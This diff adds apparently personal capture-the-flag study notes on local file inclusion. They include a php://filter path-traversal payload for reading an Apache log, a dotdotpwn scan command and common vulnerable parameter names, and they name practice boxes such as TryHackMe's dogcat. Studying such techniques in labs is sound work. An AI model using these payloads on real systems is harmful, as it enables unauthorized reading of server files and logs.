@@ -1,0 +1,24 @@
+1.) ?view=php://filter/convert.base64-encode/resource=dog/../../../../var/log/apache2/access.log&ext=
+
+	- append this to variable you think might include lfi
+	- meaning if there is a page like privacy.php? like the one on the hack.evolvesecurity.io site add:
+		- php://filter/convert.base64-encode/resource=(path or file you want to view)
+
+2.) use dotdotpwn for path traversal
+	- example of how to use it is down below
+		- dotdotpwn -m http -h 10.10.128.192 -o unix -u http://10.10.128.192/?view=TRAVERSAL
+		- look for 200's in this or it will say VULNERABLE
+
+3.) Look for php files that have ? appended to them such as privacy.php?file=
+	- there can be many things for this but ?f ?file ?view ?page and ?source are the most popular
+
+
+BOXES THAT HAVE INCLUDED LFI
+1.) tryhackme 
+	- dogcat
+2.) Offensive Security Proving grounds
+	- 
+3.) HackTheBox
+	-
+4.) Vulnhub
+	- 
